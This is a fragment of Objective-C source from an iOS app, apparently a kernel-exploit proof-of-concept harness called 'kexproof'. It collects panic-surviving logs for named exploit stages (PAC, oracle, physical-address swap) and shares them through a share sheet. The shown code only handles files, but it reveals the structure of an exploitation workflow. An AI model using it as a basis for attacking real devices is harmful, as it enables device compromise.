        [items addObject:[NSURL fileURLWithPath:live]];
    }
    // 1.2.2: previous session's log (survives reboots via rotation) — the file
    // that actually matters after a panic.
    NSString *prev = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents/kexproof-prev.log"];
    if ([[NSFileManager defaultManager] fileExistsAtPath:prev]) {
        [items addObject:[NSURL fileURLWithPath:prev]];
    }
    // инкрементальные файлы стадий (переживают панику)
    for (NSString *fn in @[@"kexproof-gart.txt", @"kexproof-pac.txt", @"kexproof-m2teardown.txt", @"kexproof-jpeg.txt", @"kexproof-reachability.txt", @"kexproof-m2oracle.txt", @"kexproof-paswap.txt"]) {
        NSString *fp = [NSHomeDirectory() stringByAppendingPathComponent:[@"Documents/" stringByAppendingString:fn]];
        if ([[NSFileManager defaultManager] fileExistsAtPath:fp]) {
            [items addObject:[NSURL fileURLWithPath:fp]];
        }
    }
    if (items.count == 0) {
        self.statusLabel.text = @"Пока нечем делиться (ни отчёта, ни live-лога)";
        return;
    }
    UIActivityViewController *activity = [[UIActivityViewController alloc] initWithActivityItems:items applicationActivities:nil];
    activity.popoverPresentationController.sourceView = self.shareButton;
    [self presentViewController:activity animated:YES completion:nil];
}

@end
